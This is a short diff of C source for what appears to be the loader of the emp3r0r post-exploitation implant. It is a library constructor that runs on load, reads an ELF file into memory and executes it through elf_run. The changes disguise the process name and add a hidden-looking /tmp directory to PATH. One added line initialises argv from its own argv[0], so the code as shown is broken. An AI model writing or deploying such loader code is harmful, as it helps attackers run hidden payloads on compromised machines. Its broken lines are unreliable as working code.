@@ -1,4 +1,5 @@
 #include <sys/types.h>
+#include <unistd.h>
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -20,11 +21,9 @@ void __attribute__((constructor)) initLibrary(void)
         char* buf = malloc(size);
         fread(buf, size, 1, f);
 
-        /* printf("main: %p\n", elf_sym(buf, "main")); */
-
         // Run the ELF
-        char* argv[] = { "emp3r0r", NULL };
-        char* envv[] = { "PATH=/bin:/usr/bin:/sbin:/usr/sbin", "HOME=/tmp", NULL };
+        char* argv[] = { argv[0], NULL };
+        char* envv[] = { "PATH=/bin:/usr/bin:/sbin:/usr/sbin:/tmp/emp3r0r/bin-aksdfvmvmsdkg", "HOME=/tmp", NULL };
         elf_run(buf, argv, envv);
     }
 }
